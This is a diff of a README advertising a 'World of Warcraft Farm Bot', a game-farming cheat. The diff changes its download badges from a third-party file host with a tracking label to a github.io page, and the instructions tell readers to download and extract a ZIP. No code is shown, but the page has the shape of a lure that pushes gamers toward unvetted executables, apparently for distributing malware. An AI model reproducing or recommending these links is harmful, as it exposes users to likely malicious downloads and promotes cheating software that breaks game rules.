@@ -1,12 +1,12 @@
 
-# 🌟 **World of Warcraft Farm Bot** **[![Download World of Warcraft Farm Bot](https://img.shields.io/badge/Download-World%20of%20Warcraft%20Farm%20Bot-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)**
+# 🌟 **World of Warcraft Farm Bot** **[![Download World of Warcraft Farm Bot](https://img.shields.io/badge/Download-World%20of%20Warcraft%20Farm%20Bot-blueviolet)](https://wow-farm-bot.github.io/wow-farmbot-fishing/)**
 🚀 **Automate Your Farming Process in World of Warcraft**
 
 ## Quick Installation
 
 To get started with **World of Warcraft Farm Bot**, follow these simple steps:
 
-1. **[![Download World of Warcraft Farm Bot](https://img.shields.io/badge/Download-World%20of%20Warcraft%20Farm%20Bot-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)**
+1. **[![Download World of Warcraft Farm Bot](https://img.shields.io/badge/Download-World%20of%20Warcraft%20Farm%20Bot-blueviolet)](https://wow-farm-bot.github.io/wow-farmbot-fishing/)**
 2. Extract the downloaded ZIP file to your desired location on your system.
 3. Follow the installation instructions provided in the documentation.
 
